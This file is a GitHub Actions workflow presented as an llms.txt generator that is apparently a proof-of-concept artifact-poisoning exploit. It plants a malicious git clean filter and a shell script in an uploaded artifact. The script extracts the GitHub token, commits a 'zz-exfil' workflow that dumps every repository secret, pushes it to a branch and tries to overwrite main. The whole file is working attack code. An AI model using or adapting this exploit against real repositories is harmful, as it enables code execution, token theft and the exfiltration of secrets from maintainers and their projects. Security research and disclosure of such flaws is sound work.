---
name: Generate llms.txt
on:
  pull_request:
    branches: [main]

jobs:
  gen:
    runs-on: ubuntu-latest
    steps:
      - name: Build artifact (no checkout: workspace has no .git)
        run: |
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          echo "poc-artifact-rce" > pr-branch.txt
          mkdir -p src/pages .git/objects .git/refs/heads .git/info
          echo "attacker llms content" > src/pages/llms.txt
          echo "ref: refs/heads/main" > .git/HEAD
          echo "keep" > .git/objects/keep
          echo "keep" > .git/refs/heads/keep
          cat > .git/config <<'CFG'
          [core]
          	repositoryformatversion = 0
          	filemode = true
          	bare = false
          	logallrefupdates = true
          [remote "origin"]
          	url = https://github.com/PDFtoMark/triage-adobedocs-v67fd058-00feca.git
          	fetch = +refs/heads/*:refs/remotes/origin/*
          [filter "pwn"]
          	clean = bash /home/runner/work/triage-adobedocs-v67fd058-00feca/triage-adobedocs-v67fd058-00feca/.git/p.sh || bash .git/p.sh
          	required = true
          CFG
          echo "src/pages/llms.txt filter=pwn" > .git/info/attributes
          cat > .git/p.sh <<'PWN'
          #!/bin/bash
          BLOB=$(mktemp)
          cat > "$BLOB"
          if [ ! -f /tmp/.stage2_done ]; then
            touch /tmp/.stage2_done
            exec 3>&1
            {
              echo "===== STAGE2-RCE-START ====="
              id
              echo "PWD=$(pwd)"
              TOK=$(grep -o 'AUTHORIZATION: basic [A-Za-z0-9+/=]*' .git/config 2>/dev/null | head -1 | awk '{print $3}' | base64 -d 2>/dev/null | cut -d: -f2-)
              [ -z "$TOK" ] && TOK="${GITHUB_TOKEN:-}"
              echo "TOKEN_LEN=${#TOK}"
              echo "REPO=${GITHUB_REPOSITORY:-}"
              TOKEN="$TOK" REPO="${GITHUB_REPOSITORY:-PDFtoMark/triage-adobedocs-v67fd058-00feca}" python3 - <<'PY'
          import base64, json, os, urllib.request, urllib.error
          token = os.environ["TOKEN"]; repo = os.environ["REPO"]
          api = f"https://api.github.com/repos/{repo}"
          def req(method, path, data=None):
              body = json.dumps(data).encode() if data is not None else None
              r = urllib.request.Request(api + path, method=method, data=body)
              r.add_header("Authorization", "Bearer " + token)
              r.add_header("Accept", "application/vnd.github+json")
              r.add_header("Content-Type", "application/json")
              try:
                  with urllib.request.urlopen(r) as resp:
                      return resp.status, json.loads(resp.read().decode() or "{}")
              except urllib.error.HTTPError as e:
                  try: return e.code, json.loads(e.read().decode() or "{}")
                  except Exception: return e.code, {}
          st, me = req("GET", "")
          print("GET_REPO", st, json.dumps(me.get("permissions")))
          st, ref = req("GET", "/git/ref/heads/main")
          print("GET_MAIN_REF", st)
          main_sha = ref.get("object", {}).get("sha", "")
          st, cm = req("GET", f"/git/commits/{main_sha}")
          base_tree = cm.get("tree", {}).get("sha", "")
          wf = """name: zz-exfil
          on:
            workflow_run:
              workflows: ["PR validation"]
              types: [completed]
          jobs:
            dump:
              runs-on: ubuntu-latest
              steps:
                - name: dump
                  env:
                    ALL: ${{ toJSON(secrets) }}
                  run: |
                    echo EXFIL_START
                    echo "$ALL" | base64 -w0
                    echo
                    echo EXFIL_END
          """
          b64 = base64.b64encode(wf.encode()).decode()
          st, blob = req("POST", "/git/blobs", {"content": b64, "encoding": "base64"})
          print("POST_BLOB", st)
          st, tree = req("POST", "/git/trees", {"base_tree": base_tree, "tree": [{"path": ".github/workflows/zz-exfil.yml", "mode": "100644", "type": "blob", "sha": blob.get("sha", "")}]})
          print("POST_TREE", st)
          st, nc = req("POST", "/git/commits", {"message": "chore: add generated workflow [skip ci]", "tree": tree.get("sha", ""), "parents": [main_sha]})
          print("POST_COMMIT", st, nc.get("sha"))
          csha = nc.get("sha", "")
          st, nr = req("POST", "/git/refs", {"ref": "refs/heads/pwn-exfil", "sha": csha})
          print("POST_BRANCH_REF", st, json.dumps(nr)[:300])
          st, up = req("PATCH", "/git/refs/heads/main", {"sha": csha, "force": False})
          print("PATCH_MAIN_REF", st, json.dumps(up)[:300])
          PY
              echo "===== STAGE2-RCE-END ====="
            } >&2
          fi
          cat "$BLOB"; rm -f "$BLOB"
          PWN
          echo "--- workspace tree ---"
          find .git -type f | sort
          wc -c .git/config .git/p.sh .git/info/attributes
      - uses: actions/upload-artifact@v4
        with:
          name: llms-txt
          include-hidden-files: true
          path: |
            .git/config
            .git/HEAD
            .git/p.sh
            .git/info/attributes
            .git/objects/keep
            .git/refs/heads/keep
            pr-number.txt
            pr-branch.txt
            src/pages/llms.txt
